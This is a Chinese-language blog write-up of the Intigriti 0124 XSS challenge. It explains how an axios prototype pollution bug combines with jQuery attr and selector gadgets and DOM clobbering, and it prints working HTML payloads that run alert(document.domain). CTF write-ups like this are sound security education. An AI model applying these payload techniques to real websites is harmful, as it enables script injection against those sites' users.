---
title: Intigriti 0124 XSS 筆記
date: 2024-02-17 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/intigriti-0124-writeup/cover.png
---

上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 [@kevin_mizu](https://twitter.com/kevin_mizu)，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。

題目的連結在這邊，沒有看過的話可以先去看看：https://challenge-0124.intigriti.io/

<!-- more -->

## 似乎比想像中簡單？

題目的程式碼滿簡短的，先來看前端的部分，基本上就是一個 HTML 而已：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intigriti XSS Challenge</title>
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>

<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="<%= search %>">
</form>

<hr>

<img src="/static/img/loading.gif" class="loading" width="50px" hidden><br>
<img class="avatar" width="35%">
<p id="description"></p>
<iframe id="homepage" hidden></iframe>

<script src="/static/js/axios.min.js"></script>
<script src="/static/js/jquery-3.7.1.min.js"></script>
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
</body>
</html>

```

其中這一段 `<h2>Hey <%- name %>` 是與後端唯一有關的部分，會在後端使用 DOMPurify 來進行 sanitization：

``` js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
  return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});
```

值得注意的是這邊的 `SANITIZE_DOM: false`，這個設置會停止對於 DOM Clobbering 的防護，因此可以猜測這題與 DOM Clobbering 有關，才會刻意把這個設置關掉。

而整題最主要的邏輯都在 search 函式裡面了：

``` js
function search(name) {
    $("img.loading").attr("hidden", false);

    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    }).then((d) => {
        $("img.loading").attr("hidden", true);
        const repo = d.data;
        if (!repo.owner) {
            alert("Not found!");
            return;
        };

        $("img.avatar").attr("src", repo.owner.avatar_url);
        $("#description").text(repo.description);
        if (repo.homepage && repo.homepage.startsWith("https://")) {
            $("#homepage").attr({
                "src": repo.homepage,
                "hidden": false
            });
        };
    });
};
```

其實上面這一段，並沒有看出什麼有漏洞的地方，因此看完這段之後，我就先往用到的 library 去找，這題用到的是 jQuery 3.7.1 以及 axios 1.6.2，雖然檔案名稱沒寫，但是從檔案內容可以看得出來。

查了一下可以發現 1.6.2 並非最新版本，而且在 1.6.4 中修復了一個 prototype pollution 的漏洞：https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e

commit 裡面更是直接附上了 exploit，非常貼心：

``` js
it('should resist prototype pollution CVE', () => {
    const formData = new FormData();

    formData.append('foo[0]', '1');
    formData.append('foo[1]', '2');
    formData.append('__proto__.x', 'hack');
    formData.append('constructor.prototype.y', 'value');

    expect(formDataToJSON(formData)).toEqual({
      foo: ['1', '2'],
      constructor: {
        prototype: {
          y: 'value'
        }
      }
    });

    expect({}.x).toEqual(undefined);
    expect({}.y).toEqual(undefined);
});
```

從 commit 可以看出 axios 中有一個叫做 `formDataToJSON` 的函式，會把 FormData 轉為 JSON，而轉換的程式碼中存有漏洞，可以透過 name 進行 prototype pollution。

接著再回來看題目的程式碼，有一段是：`axios.post("/search", $("#search").get(0)`，因此只要能掌握 `#search`，就能掌握這邊傳入的參數，從 axios 的原始碼中可以看出這邊傳入的 form，最後會被取出 FormData，並且傳給 `formDataToJSON`（這邊引用的部分程式碼看不出來，但只要 trace 一下之後不難發現這件事）。

因此，我們可以用 name 注入一個 `<form>` 來進行 prototype pollution，下一步就要尋找 gadget 了，通常在找 gadget 的時候，會先從物件下手。

而程式碼中有個部分非常可疑：

``` js
$("#homepage").attr({
    "src": repo.homepage,
    "hidden": false
});
```

這裡傳入的參數是個物件，如果 `.attr` 函式沒有特別做檢查，很有可能會被污染的參數影響，而事實上也是這樣，在 jQuery 中，[attr 的實作如下](https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16)：

``` js
jQuery.fn.extend( {
    attr: function( name, value ) {
        return access( this, jQuery.attr, name, value, arguments.length > 1 );
    },
}
```

[access 的部分實作](https://github.com/jquery/jquery/blob/main/src/core/access.js#L12)：

``` js
export function access( elems, fn, key, value, chainable, emptyGet, raw ) {
    var i = 0,
        len = elems.length,
        bulk = key == null;

    // Sets many values
    if ( toType( key ) === "object" ) {
        chainable = true;
        for ( i in key ) {
            access( elems, fn, i, key[ i ], true, emptyGet, raw );
        }
    }
}
```

如果傳入的 key 是個 object，會用 in 來取出每一個 key 設定。由於 in 會取出原型鏈上的屬性，因此可以透過污染 `onload`，讓 jQuery 去設定 onload 屬性。

payload 如下：

``` html
<form id=search>
  <input name=__proto__.onload value=alert(document.domain)>
  <input name=q value=react-d3><
</form>
```

看起來沒什麼問題，但嘗試過後，會發現出現了錯誤：

```
Uncaught (in promise) TypeError: Cannot use 'in' operator to search for 'set' in alert(document.domain)
```

經過一陣 debug 之後，會發現這段錯誤是源自於設置 attr 時的這一段：

``` js
// Attribute hooks are determined by the lowercase version
// Grab necessary hook if one is defined
if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
    hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
        ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
}

if ( value !== undefined ) {
    if ( value === null ) {
        jQuery.removeAttr( elem, name );
        return;
    }

    if ( hooks && "set" in hooks &&
        ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
        return ret;
    }

    elem.setAttribute( name, value + "" );
    return value;
}
```

會先執行到 `hooks = jQuery.attrHooks[ name.toLowerCase() ]`，由於我們污染了 `onload` 屬性，所以 `jQuery.attrHooks['onload']` 會是字串，因此 hooks 也是個字串。

接著執行到 `"set" in hooks`，由於字串並沒有 `in` 可以用，因此拋出了先前看到的錯誤。

既然知道問題在哪了，那解決方式就簡單了，把 `onload` 改成 `Onload` 就好，因為如此一來 `name.toLowerCase()` 就會是 `onload`，而 `jQuery.attrHooks['onload']` 並不存在。

做到這裡，題目就解開了，難度比我想像中的容易很多，大約花個 3-4 個小時差不多。接著，我看到了作者的[推特](https://twitter.com/kevin_mizu/status/1744552795410456756)，意識到原來是有 unintended，難怪難度比我想得要低。

## 預期解法也沒這麼難...嗎？

知道自己的解法是非預期之後，就開始思考起什麼才是預期解，作者有在 Discord 裡面說預期解法跟現在的非預期解法，使用到的地方完全不同，因此可以想像是把 `attr({})` 那一段排除，留下剩下的程式碼，就只剩這些：

``` js
function search(name) {
    $("img.loading").attr("hidden", false);

    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    }).then((d) => {
        $("img.loading").attr("hidden", true);
        const repo = d.data;
        if (!repo.owner) {
            alert("Not found!");
            return;
        };

        $("img.avatar").attr("src", repo.owner.avatar_url);
        $("#description").text(repo.description);
    });
};
```

剩下的程式碼中，我的直覺告訴我重點是這一行：

``` js
$("img.avatar").attr("src", repo.owner.avatar_url);
```

如果可以利用 prototype pollution 把 `$("img.avatar")` 變成 `$('#homepage')`，選到那個 iframe 的話，再搭配上我們可以掌握 `repo.owner.avatar_url`，就能把 iframe 的 src 設置成 `javascript:alert(1)`，達成 XSS。

我覺得這個猜測非常合理，大概有九成的把握是對的，因為透過 prototype pollution 來影響 selector 這個招數應該是新的，至少我之前沒看過，而且這個很酷！也符合了作者在推特上講的：「super interesting」

因此，接下來我就花了點時間開始尋找 selector 是怎麼運作的，但這段程式碼比我想像中複雜了不少，而且牽涉到許多函式。

花了四五個小時之後，終於找到一個可以利用的地方。

首先，在執行 `$()` 的時候，底層是用 [find](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197) 來找到對應的元素，而這邊會有一個 `documentIsHTML` 的檢查，如果是 true 的話，基本上就會就是利用 querySelector 之類的原生 API 去尋找，沒有操作空間。

因此我們要先想辦法讓它是 false，判斷的程式碼在[這裡](https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330)，只要讓 `isXMLDoc` 回傳 true，`documentIsHTML` 就會是 false：

``` js
isXMLDoc: function( elem ) {
    var namespace = elem && elem.namespaceURI,
        docElem = elem && ( elem.ownerDocument || elem ).documentElement;

    // Assume HTML when documentElement doesn't yet exist, such as inside
    // document fragments.
    return !rhtmlSuffix.test( namespace || docElem && docElem.nodeName || "HTML" );
},
```

我們可以透過 DOM clobbering 去覆蓋掉 `documentElement`，來讓 `docElem` 變成一個 `<img>`，因為不是 `<html>`，就可以讓檢查失效，並且讓 `isXMLDoc` 變成 true。

繞過了檢查以後，就暫時不會用原生的那些 API，而是執行到 [select](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001) 函式，開頭會先將 selector 做 [tokenize](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1479)：

``` js
function tokenize( selector, parseOnly ) {
    var matched, match, tokens, type,
        soFar, groups, preFilters,
        cached = tokenCache[ selector + " " ];

    if ( cached ) {
        return parseOnly ? 0 : cached.slice( 0 );
    }

    // ...
}
```

這邊看起來就是我們要找的地方了！

只要污染 `img.avatar `，就可以控制 `tokenCache` 的內容，進而影響到 tokenize 的結果，直接把結果替代成我們要選的 iframe。

看來預期解法也沒這麼難嘛。

但嘗試過後，發現沒有用。

沒有用的原因不是因為 gadget 找錯，而是因為 prototype pollution 的部分。此時，就被逼得回頭研究之前偷懶只看 exploit 的 axios 漏洞。

Axios 在把 form 的名稱轉成 JSON 的 key 時，是這樣[運作](https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12)的：

``` js
/**
 * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z']
 *
 * @param {string} name - The name of the property to get.
 *
 * @returns An array of strings.
 */
function parsePropPath(name) {
  // foo[x][y][z]
  // foo.x.y.z
  // foo-x-y-z
  // foo x y z
  return utils.matchAll(/\w+|\[(\w*)]/g, name).map(match => {
    return match[0] === '[]' ? '' : match[1] || match[0];
  });
}
```

會把 A-Za-z0-9_ 以外的字元都當作分隔符號，因此空白沒辦法成為屬性名稱的一部分。我在這邊花了三四個小時，沒有找到任何可以繞過的方式。

此時我知道我錯了，這題真的沒這麼簡單...

## 人生三大錯覺之一：我能解開

過了一天以後，繼續看這道題目，既然沒辦法用空白，那應該是有其他地方可以利用，於是就接著追蹤程式碼的運作。

繼續一直往下追的話，會追到 [matcherFromTokens](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766) 這個函式，但裡面的程式碼一樣又多又複雜，於是我第一次看到的時候心裡想著：「算了吧，還是等解答好了」。

但過了一天之後重振精神，再次從頭開始看起，發現其實在進入 tokenize 之前，就有一個地方可以污染了：

``` js
function select( selector, context, results, seed ) {
  var i, tokens, token, type, find,
    compiled = typeof selector === "function" && selector,
    match = !seed && tokenize( ( selector = compiled.selector || selector ) );
// ...
}
```

這邊有個 `selector = compiled.selector || selector`，那只要污染 `selector`，我不就可以任意更改 selector 了嗎？

正當我為自己的聰明沾沾自喜時，現實馬上跑過來打了我一巴掌，污染了 selector 之後，在進入到 tokenize 時出錯了，因為裡面有一段是：

``` js
// Filters
for ( type in filterMatchExpr ) {
    if ( ( match = jQuery.expr.match[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
        ( match = preFilters[ type ]( match ) ) ) ) {
        matched = match.shift();
        tokens.push( {
            value: matched,
            type: type,
            matches: match
        } );
        soFar = soFar.slice( matched.length );
    }
}
```

因為污染了 selector，所以在執行 `type in filterMatchExpr` 的時候，被污染的 selector 就會被取出來，接著執行到 `jQuery.expr.match[ type ].exec`，由於字串並沒有 exec 這個方法，所以就會報錯。

也就是說，不管我們污染了什麼，只要進入到 tokenize 就會出錯，所以想要把 selector 直接污染成 iframe 是辦不到的。

但沒關係，我們可以把 selector 污染成之前已經在 cache 裡面的東西，例如說 `img.loading`，就可以繞過 tokenize。

但這也只是不讓程式壞掉而已，依舊沒辦法把題目解開。

## 還是得靠提示

又過了一兩天，看到了作者在推特上的[提示](https://twitter.com/kevin_mizu/status/1749740885657755842)，直接明確指出關鍵就在於我之前因為太複雜所以略過的 addCombinator，從提示中可以看出，我確實只差最後一步了。

因此又硬著頭皮花了半天左右，稍微 trace 了一下這部分的程式碼，最後才終於得到預期的答案。

先附上最後的 payload：

``` html
<img name=documentElement>
<form id="search">
    <input name="__proto__.owner.avatar_url" value="javascript:alert(document.domain)">
    <input name="__proto__.CLASS.a" value="1">
    <input name="__proto__.TAG.a" value="1">
    <input name="__proto__.dir" value="parentNode">
    <input name="__proto__.selector" value="img.loading">
</form>
```

其實最後一部分 addCombinator 那邊有點像是一半用猜的，一半是真的知道，大概就是某一個部分會用 `dir` 來找匹配的元素，設定成 parentNode 之後就會一直往上找，然後就會配對到整個 HTML 的元素，因此就會幫每一個 element 都加上 src，裡面當然也包含了 iframe。

但每一個函式的細節我已經忘記了，因為真的有點複雜，如果有興趣知道的話，可以直接去看原作者的 writeup（底下會附上連結）。

## 後記

我很喜歡這道題目那種循序漸進的感覺，從一開始找到非預期解以為很簡單，到後來找到第一個 cache 的地方以為解開了，卻回頭發現 axios 的 prototype pollution 沒辦法搭配使用，接著找到第二個 `compiled.seletor` 也以為結束了，才發現其實還沒。

要一直再往下深追，追到 addCombinator，才能確定這一題是真的可以解開，能在一道題目裡面情緒起伏這麼多次，代表這個題目設計的很好。另一個我很喜歡的點是這是一道逼迫你 code review 的題目，沒看 code 的話是絕對解不開的。我很喜歡 code review，因此也很喜歡這個題目。

很佩服作者能夠繼續往深處探索，找到這個非常有趣的答案，結合了 DOM clobbering 跟 prototype pollution，修改了 jQuery selector 的指向，出了一題這麼好玩的題目！

再次推薦作者本人的 writeup，跟我經歷了差不多的過程：[Intigriti January 2024 - XSS Challenge](https://mizu.re/post/intigriti-january-2024-xss-challenge)

除此之外，@joaxcar 找到的另外一個非預期解也很有趣，有興趣的可以看看：[Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/)

若是對最一開始的題目有興趣，也可以參考這邊：https://bugology.intigriti.io/intigriti-monthly-challenges/0124

